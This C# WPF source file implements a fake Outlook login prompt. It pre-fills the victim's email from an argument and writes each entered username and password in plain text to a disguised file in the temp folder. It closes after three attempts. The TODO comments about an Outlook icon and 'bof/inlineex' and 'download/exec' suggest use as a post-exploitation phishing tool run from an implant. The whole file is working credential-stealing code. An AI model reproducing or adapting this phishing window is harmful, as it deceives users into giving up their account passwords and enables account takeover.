using System;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Input;
using System.IO;
using System.Media;


// TODO:
// - outlook icon, overlay warning image
// - sta thread error with bof/inlineex
//   - download/exec for now

namespace WpfUI
{
    public partial class MainWindow : Window
    {
        private string logFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "abckdlfdpeoovnp.bin");
        private int loginAttempts = 0;
        private int clickCount = 0;

        public MainWindow()
        {
            //DownloadAndLoadDlls();

            InitializeComponent();
            //DownloadAndLoadDlls();
            //String[] args = App.Args;
            string arg = App.Arg;

            if (!string.IsNullOrEmpty(arg))
            {
                // Use the argument
                connecting_text.Text += arg;
                email_field.Text += arg;
            }
            //connecting_text.Text += args[0];
            //email_field.Text += args[0];
            password_field.Focus();

            double screenWidth = SystemParameters.PrimaryScreenWidth;
            double screenHeight = SystemParameters.PrimaryScreenHeight;
            double windowWidth = this.Width;
            double windowHeight = this.Height;

            // top middle start position
            this.Left = (screenWidth - windowWidth) / 2;
            this.Top = 0; // Set to the top of the screen
        }

        // password placeholder
        // - not perfect
        private void PasswordField_PasswordChanged(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrEmpty(password_field.Password))
            {
                passwordPlaceholder.Visibility = Visibility.Visible;
            }
            else
            {
                passwordPlaceholder.Visibility = Visibility.Collapsed;
            }
        }

        private void PasswordField_GotFocus(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrEmpty(password_field.Password))
            {
                passwordPlaceholder.Visibility = Visibility.Visible;
            }
        }

        private void PasswordField_LostFocus(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrEmpty(password_field.Password))
            {
                passwordPlaceholder.Visibility = Visibility.Visible;
            }
        }

        private void PasswordPlaceholder_GotFocus(object sender, RoutedEventArgs e)
        {
            passwordPlaceholder.Visibility = Visibility.Collapsed;
            password_field.Visibility = Visibility.Visible;
            password_field.Focus();
        }

        private void PasswordPlaceholder_LostFocus(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrEmpty(password_field.Password))
            {
                passwordPlaceholder.Visibility = Visibility.Visible;
            }
        }


        private void LogToFile(string logMessage)
        {
            try
            {
                using (StreamWriter sw = File.AppendText(logFilePath))
                {
                    sw.WriteLine(logMessage);
                }
            }
            catch (Exception ex)
            {
                // exception
            }
        }

        private async void OkButton_Click(object sender, EventArgs e)
        {
            loginAttempts++;

            SystemSounds.Exclamation.Play();
            this.Cursor = Cursors.Wait;
            await Task.Delay(1000);
            this.Cursor = Cursors.Arrow;

            LogToFile($"{DateTime.Now.ToString()} - Outlook Username: {email_field.Text} - Password: {password_field.Password}");

            if (loginAttempts == 3)
            {
                this.Cursor = Cursors.Wait;
                await Task.Delay(1000);
                Application.Current.Shutdown();
            }
            else
            {
                // do nothing
            }
        }

        private async void CancelButton_Click(object sender, EventArgs e)
        {

            clickCount++;

            if (clickCount == 3)
            {
                this.Cursor = Cursors.Wait;
                await Task.Delay(1000);
                Application.Current.Shutdown();
            }
        }
    }
}